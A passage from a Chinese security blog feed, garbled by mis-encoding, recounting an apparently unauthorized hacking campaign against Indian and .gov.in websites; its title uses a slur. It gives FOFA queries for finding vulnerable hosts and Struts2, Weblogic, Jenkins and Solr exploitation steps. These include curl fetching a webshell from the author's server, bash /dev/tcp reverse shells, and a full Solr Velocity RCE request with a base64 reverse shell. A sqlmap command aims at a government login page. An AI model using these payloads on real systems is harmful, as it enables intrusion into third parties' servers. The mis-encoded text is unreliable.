class="string">&quot;https://&quot;</span>):</span><br><span class="line">            <span class="comment"># å¦‚æœä¸åŒ…å«ï¼Œåˆ™åœ¨åŸŸåå‰æ·»åŠ &quot;http://&quot;</span></span><br><span class="line">            request = <span class="string">&quot;http://&quot;</span> + request</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åœ¨åŸŸååæ·»åŠ æ–œæ &quot;/&quot;</span></span><br><span class="line">        request += <span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å°†è¯·æ±‚å’Œå€¼&quot;1&quot;ä½œä¸ºä¸€è¡Œå†™å…¥CSVæ–‡ä»¶</span></span><br><span class="line">        writer.writerow([request, <span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>æ˜¯çš„ï¼Œè‚¯å®šä¸èƒ½è·‘ï¼Œä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•çœ‹çœ‹</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711024218564.png" alt="image-20230711024218564"></p>
<p>å¾ˆå¥½ç¡®å®æ˜¯ä¸èƒ½ç›´æ¥å¹²7wæ¡ï¼Œæ¢ä¸ªæ”¶é›†æ€è·¯ï¼Œæ”¶é›†ä¸»æµæ¡†æ¶è¿›è¡Œç›¸åº”çš„æ¼æ‰«</p>
<p>ä¸»æµæ¡†æ¶çš„ç›¸å…³æ¼æ´çš„FOFAè§„åˆ™è¯­å¥ï¼š</p>
<p><strong>Fastjson</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">app=&quot;Fastjson&quot; &amp;&amp; host=&quot;in&quot; &amp;&amp; country=&quot;IN&quot; &amp;&amp; status_code=&quot;200&quot; &amp;&amp; (port=&quot;80&quot; || port=&quot;443&quot;)</span><br></pre></td></tr></table></figure>
<p><strong>Struts2</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">app=&quot;Struts&quot; &amp;&amp; host=&quot;in&quot; &amp;&amp; country=&quot;IN&quot; &amp;&amp; status_code=&quot;200&quot; &amp;&amp; (port=&quot;80&quot; || port=&quot;443&quot;)</span><br></pre></td></tr></table></figure>
<p><strong>Log4j2</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(app=&quot;Log4j2&quot; &amp;&amp; host=&quot;in&quot; &amp;&amp; country=&quot;IN&quot; &amp;&amp; status_code=&quot;200&quot; &amp;&amp; (port=&quot;80&quot; || port=&quot;443&quot;))</span><br></pre></td></tr></table></figure>
<p>å…¶ä»–çš„ä¹Ÿéƒ½å¤§åŒå°å¼‚ï¼Œç…§è‘«èŠ¦ç”»ç“¢å°±è¡Œã€‚</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711025300355.png" alt="image-20230711025300355"></p>
<p>ç›®æ ‡ç«™ç‚¹æ”¶é›†å·®ä¸å¤šäº†ï¼Œå°±æ˜¯æ¼æ´æ¢æµ‹é˜¶æ®µäº†ã€‚</p>
<h2 id="0x02-æ¼æ´æ¢æµ‹åŠåˆ©ç”¨"><a class="markdownIt-Anchor" href="#0x02-æ¼æ´æ¢æµ‹åŠåˆ©ç”¨"></a> 0x02ã€æ¼æ´æ¢æµ‹åŠåˆ©ç”¨</h2>
<h3 id="struts2"><a class="markdownIt-Anchor" href="#struts2"></a> Struts2ï¼š</h3>
<p>ç›´æ¥æå‡ºå¤§èŒƒå›´æ¼æ‰«AWVSå°±è¡Œæ‰¹é‡æ¼æ´æ¢æµ‹ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711025640689.png" alt="image-20230711025640689"></p>
<p>ç¬¬ä¸€å¤©æ•°æ®å°±ç›´æ¥èµ·é£ï¼Œå› ä¸ºæœ¬æ¬¡ç›®æ ‡æ˜¯<mark>getshell</mark>ç›´æ¥å¿½ç•¥ä¸­ä½å±æ¼æ´å‘Šè­¦ï¼ŒæŸ¥çœ‹é«˜å±æ¼æ´ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711025838442.png" alt="image-20230711025838442"></p>
<p>å¾ˆå¥½ä¸€å †<mark>Struts2</mark>æ¼æ´ï¼Œç›´æ¥ä¸Šå·¥å…·ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711030506931.png" alt="image-20230711030506931"></p>
<p>å¾—åˆ°ä¸€ä¸ªRCEï¼ˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼‰ï¼Œè¿œç¨‹å†™å…¥<mark>shell</mark>ï¼Œå…ˆåˆ©ç”¨å·¥å…·ç”Ÿæˆä¸€ä¸ª<mark>Antsword(èšå‰‘)jspæ ¼å¼çš„shell</mark></p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711030808818.png" alt="image-20230711030808818"></p>
<p>å°†shellæ”¾åˆ°ä¸€ä¸ªå…¬ç½‘æœåŠ¡å™¨ä¸Šï¼Œæ¥ç€æ‰§è¡Œå‘½ä»¤æŸ¥çœ‹webè·¯å¾„ï¼š<code>/var/tomcat9/pmrportal/ROOT/</code></p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711031350331.png" alt="image-20230711031350331"></p>
<p>ç›´æ¥æ‰§è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -o /var/tomcat9/pmrportal/ROOT/shell.jsp http://u_ip/antsword.jsp</span><br></pre></td></tr></table></figure>
<p>ç„¶åwebshellå·¥å…·Antswordè¿æ¥å³å¯ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711031634840.png" alt="image-20230711031634840"></p>
<p>çˆ†å‡ºçš„è¯¥S2-045çš„æ¼æ´çš„è¿˜æœ‰å‡ ä¸ªï¼Œgetshellæ–¹å¼åŒä¸Šï¼Œä¸è¿›è¡Œç»†è¿°äº†___________________________________ã€‚</p>
<h3 id="weblogic"><a class="markdownIt-Anchor" href="#weblogic"></a> Weblogicï¼š</h3>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711025901659.png" alt="image-20230711025901659"></p>
<p>å¾ˆå¥½ç”¨çš„awvsï¼Œç›´æ¥ä¸Šå·¥å…·æ³¨å…¥å†…å­˜é©¬ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713175036472.png" alt="image-20230713175036472"></p>
<p>å†°èè¿æ¥webshellï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713175143564.png" alt="image-20230713175143564"></p>
<p>åŒç±»å‹çš„æ¼æ´è¿˜æœ‰å‡ ä¸ªï¼Œgetshellçš„æ–¹å¼éƒ½ä¸€è‡´ï¼Œä¸ä¸€ä¸€æ¦‚è¿°äº†ã€‹ã€‹</p>
<p>ï¼ˆPSï¼šè¿™ä¸ªæ—¶å€™å·²ç»æœ‰äº›ç–²è½¯äº†ï¼Œæ²¡æœ‰å»æ‰‹æµ‹uploadçš„ç‚¹ï¼‰</p>
<h3 id="jenkins"><a class="markdownIt-Anchor" href="#jenkins"></a> Jenkinsï¼š</h3>
<p>ä¸­é€”å…¶ä»–æ¡†æ¶æ²¡æœ‰æ”¶è·çš„æ—¶å€™ï¼Œå°±å»æµè§ˆçŸ¥è¯†çš„æµ·æ´‹äº†ï¼Œçœ‹åˆ°ä¸€ä¸ªå­˜åœ¨å¤§é‡æœªæˆæƒ+RCEçš„æ¡†æ¶æ¼æ´ï¼ˆ<strong>Jenkins</strong>ï¼‰ï¼ŒäºŒè¯ä¸è¯´ï¼Œç›´æ¥ä¸ŠFOFAï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(app=&quot;JENKINS&quot; &amp;&amp; title==&quot;Dashboard [Jenkins]&quot; &amp;&amp; country=&quot;IN&quot; &amp;&amp; status_code=&quot;200&quot;) &amp;&amp; (port=&quot;80&quot; || port=&quot;443&quot;)</span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713220128955.png" alt="image-20230713220128955"></p>
<p>ä¸€çœ‹86æ¡èµ„äº§ï¼Œæœ‰æˆï¼Œæ•°é‡ä¸å¤šï¼Œç›´æ¥æ‰‹æµ‹ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713180849084.png" alt="image-20230713180849084"></p>
<p>å­˜åœ¨æœªæˆæƒï¼Œè®¿é—®manager --&gt; scripté¡µé¢ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œæµ‹è¯•ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">println &quot;ls -al&quot;.execute().text</span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713181156856.png" alt="image-20230713181156856"></p>
<p>å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œå°è¯•åå¼¹shellï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">println &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&lt;&amp;1&quot;.execute().text</span><br></pre></td></tr></table></figure>
<p>æ¥æ”¶shellçš„æœåŠ¡å™¨å¼€å¯ç«¯å£ç›‘å¬ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713181947756.png" alt="image-20230713181947756"></p>
<p>æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713181823099.png" alt="image-20230713181823099"></p>
<p>å‘ç°æ²¡æœ‰shellåå¼¹è¿‡æ¥ï¼ŒçŒœæµ‹ä¸èƒ½åœ¨webç«¯æ‰§è¡Œåå¼¹shellï¼Œäºæ˜¯å°†åå¼¹shellçš„å‘½ä»¤å†™å…¥.shæ–‡ä»¶ä¸­ï¼Œç„¶åæ‰§è¡Œï¼Œè¿›è¡Œåå¼¹shellæ“ä½œï¼š</p>
<p>åœ¨shæ–‡ä»¶ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&lt;&amp;1</span><br></pre></td></tr></table></figure>
<p>ä¿å­˜åœ¨å¼€æ”¾çš„webç«¯å£ï¼Œåœ¨jenkinsæœåŠ¡ä¸­æ‰§è¡Œå¦‚ä¸‹curlå‘½ä»¤è¿œç¨‹ä¸‹è½½shæ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">println <span class="string">&quot;curl - o /tmp/jenkins.sh http://u_ip:port/jenkins.sh&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713182926953.png" alt="image-20230713182926953"></p>
<p>æŸ¥çœ‹.shæ–‡ä»¶æ˜¯å¦è·å–æˆåŠŸï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">println &quot;ls -al /tmp&quot;.execute().text</span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713183110423.png" alt="image-20230713183110423"></p>
<p>è·å–.shæ–‡ä»¶æˆåŠŸï¼Œæ‰§è¡Œæ–‡ä»¶ï¼Œåå¼¹shellï¼š</p>
<p>å¼€å¯ç›‘å¬ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713183406307.png" alt="image-20230713183406307"></p>
<p>æ‰§è¡Œå‘½ä»¤ï¼Œå¯åŠ¨.shæ–‡ä»¶ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">println &quot;bash /tmp/jenkins.sh&quot;.execute().text</span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713183606528.png" alt="image-20230713183606528"></p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230713183513017.png" alt="image-20230713183513017"></p>
<p>æˆåŠŸç›‘å¬åˆ°è°ˆè¿‡æ¥çš„shellï¼Œåˆæ‹¿ä¸‹ä¸€å°ï¼å…¶ä»–çš„æ²¡æœ‰å­˜åœ¨æœªæˆæƒï¼Œä¾¿æ²¡æœ‰å°è¯•ã€‚</p>
<h3 id="apache-solr"><a class="markdownIt-Anchor" href="#apache-solr"></a> Apache-Solr</h3>
<p>é—²ç€æ²¡äº‹ï¼Œæ‰“å¼€æ–‡åº“çœ‹äº†å‡ ç¯‡RCEå¤ç°ï¼Œå¿ƒè¡€æ¥æ½®ï¼Œæ‰“å¼€FOFAï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">country=<span class="string">&quot;IN&quot;</span> &amp;&amp; app=<span class="string">&quot;Apache-Solr&quot;</span> &amp;&amp; status_code=<span class="string">&quot;200&quot;</span> &amp;&amp; (port=<span class="string">&quot;443&quot;</span> || port=<span class="string">&quot;80&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719101927146.png" alt="image-20230719101927146"></p>
<p>æ•°æ®ä¸å¤§ï¼Œæ¥ç€æ‰‹æµ‹ï¼Œæ‹¿åˆ°ä¸‰ä¸ªæœªæˆæƒ(ä¸éœ€è¦ç™»é™†)ï¼š</p>
<p><mark>æˆæƒ</mark>ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719102234003.png" alt="image-20230719102234003"></p>
<p><mark>æœªæˆæƒ</mark>ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719102331665.png" alt="image-20230719102331665"></p>
<p>æ‹¿åˆ°æœªæˆæƒä¹‹åï¼Œè¿›è¡ŒCVEæ¢æµ‹ï¼š</p>
<p>è®¿é—®<code>/solr/admin/cores/</code>ï¼Œè·å–<code>name =&gt; music</code></p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719102848788.png" alt="image-20230719102848788"></p>
<p>æ¥ç€æ‹¼æ¥è·¯å¾„<code>/solr/music/config/</code>æŸ¥çœ‹ç”¨æˆ·é…ç½®ä¿¡æ¯ï¼š</p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719103210432.png" alt="image-20230719103210432"></p>
<p>éƒ½ä¸º<code>true</code>ï¼Œå¯ç›´æ¥åˆ©ç”¨å…¬ç½‘æŠ«éœ²çš„payloadè¿›è¡ŒRCEï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /solr/music/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set(<span class="variable">$x</span>=%27%27)+%23set(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Runtime%27))+%23set(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Character%27))+%23set(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(%27java.lang.String%27))+%23set(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().<span class="built_in">exec</span>(%22whoami%22))+<span class="variable">$ex</span>.waitFor()+%23set(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+%23foreach(<span class="variable">$i</span>+<span class="keyword">in</span>+[1..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.<span class="built_in">read</span>()))%23end HTTP/1.1</span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719115129111.png" alt="image-20230719115129111"></p>
<p>æµ‹è¯•æ˜¯å¦å‡ºç½‘ï¼š</p>
<p>ä¿®æ”¹æ‰§è¡Œå‘½ä»¤ä¸º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl%20xtolsc.dnslog.cn</span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719115425835.png" alt="image-20230719115425835"></p>
<p>å¯å‡ºç½‘ï¼Œç›´æ¥åå¼¹shellï¼š</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">GET /solr/music/select?q=<span class="number">1</span>&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=<span class="meta">%23set</span>(<span class="variable">$x</span>=<span class="meta">%27</span><span class="meta">%27</span>)+<span class="meta">%23set</span>(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.Runtime<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.Character<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.String<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().exec(<span class="meta">%22bash</span><span class="meta">%20-c</span><span class="meta">%20</span><span class="meta">%7Becho</span><span class="meta">%2CYmFzaCAtaSA</span><span class="meta">%2BJiAvZGV2xxxxxx8xMDEuNDMuMTM5LjI0My81MDAwIDA</span><span class="meta">%2BJjE</span><span class="meta">%3D</span><span class="meta">%7D</span><span class="meta">%7C</span><span class="meta">%7Bbase64</span><span class="meta">%2C-d</span><span class="meta">%7D</span><span class="meta">%7C</span><span class="meta">%7Bbash</span><span class="meta">%2C-i</span><span class="meta">%7D</span><span class="meta">%22</span>))+<span class="variable">$ex</span>.waitFor()+<span class="meta">%23set</span>(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+<span class="meta">%23foreach</span>(<span class="variable">$i</span>+<span class="keyword">in</span>+[<span class="number">1</span>..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.read()))<span class="meta">%23end</span>  HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ip</span><br><span class="line">accept: */*</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0</span>.<span class="number">0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<p>VPSå¼€å¯ç«¯å£ç›‘å¬ï¼š<code>nc -lvvnp 5000</code></p>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230719115817964.png" alt="image-20230719115817964"></p>
<p>æ¥å¬åˆ°å¼¹è¿‡æ¥çš„shelläº†ï¼Œå¥½ï¼Œåˆæ‹¿ä¸‹ä¸€å°ï¼Œrootæƒé™ã€‚</p>
<h3 id="å…¶ä»–æ¼æ´å‘ç°"><a class="markdownIt-Anchor" href="#å…¶ä»–æ¼æ´å‘ç°"></a> å…¶ä»–æ¼æ´å‘ç°</h3>
<h4 id="åå°„å‹xss"><a class="markdownIt-Anchor" href="#åå°„å‹xss"></a> åå°„å‹XSS</h4>
<p>å…·ä½“æµ‹è¯•è¿‡ç¨‹å‡æ— ä»»ä½•éš¾åº¦ï¼Œæ— é¡»bypassé»‘åå•ä¹‹ç±»çš„ï¼Œæµ‹è¯•è¯­å¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230726182631855.png" alt="image-20230726182631855"></p>
<h4 id="sqlæ³¨å…¥"><a class="markdownIt-Anchor" href="#sqlæ³¨å…¥"></a> SQLæ³¨å…¥</h4>
<p>è¿™ç±»æ²¡æœ‰å…·ä½“æµ‹è¯•ï¼Œå‘ç°æ³¨å…¥ç‚¹ä¹‹åç›´æ¥ä¸ŠSQLmapå¼€æ‰«ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap https://******.gov.in/****/Validate.jsp --data <span class="string">&quot;email=a@a.com&amp;password=123456&quot;</span> --random-agent -t 10 -p password --proxy=http://127.0.0.1:7890 --dbms=mysql</span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230726183935140.png" alt="image-20230726183935140"></p>
<h2 id="æ¸—é€æ€»ç»“"><a class="markdownIt-Anchor" href="#æ¸—é€æ€»ç»“"></a> æ¸—é€æ€»ç»“</h2>
<p>æœ¬æ¬¡æµ‹è¯•å‘¨æœŸé•¿ï¼Œæµ‹è¯•ç›®æ ‡æš´éœ²ç‚¹å¤šï¼Œéå¸¸æœ‰è¶£çš„ä¸€æ¬¡æ¸—é€å®æˆ˜ï¼ŒåæœŸæœ‰å…¶ä»–äº‹å„¿ï¼Œå°±æ²¡æ³•å…¨èº«å¿ƒæŠ•å…¥ï¼Œè›®å¯æƒœçš„ã€‚</p>
]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>è“æ¡¥æ¯CTF-ezphp-Wirteup</title>
    <url>/2023/06/%E8%93%9D%E6%A1%A5%E6%9D%AFCTF-ezphp-Wirteup/</url>
    <content><![CDATA[<p>emmä¸€é“è›®æœ‰æ„æ€çš„ååºåˆ—åŒ–ï¼Œé“¾å­ä¸é•¿ï¼Œå¾ˆå¥½æ„å»ºï¼Œå…¥å£å’Œå‡ºå£éƒ½å¾ˆå¥½æ‰¾ï¼Œé‡ç‚¹å°±æ˜¯å¦‚ä½•bypass<code>strstr_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser)</code>ï¼Œè¿˜æœ‰å°±æ˜¯å†™äº†å‡ ä¸ªå°æ—¶ï¼Œç‰¹æ„å†™ä¸ªwpè®°å½•ä¸€ä¸‹<img src="/2023/06/%E8%93%9D%E6%A1%A5%E6%9D%AFCTF-ezphp-Wirteup/image-20230603181156418.png" alt="image-20230603181156418"></p>
<span id="more"></span>
<h1 id="è“æ¡¥æ¯ctf-ezphp-wirteup"><a class="markdownIt-Anchor" href="#è“æ¡¥æ¯ctf-ezphp-wirteup"></a> è“æ¡¥æ¯CTF-ezphp-Wirteup</h1>
<h2 id="é¢˜ç›®æè¿°"><a class="markdownIt-Anchor" href="#é¢˜ç›®æè¿°"></a> é¢˜ç›®æè¿°</h2>
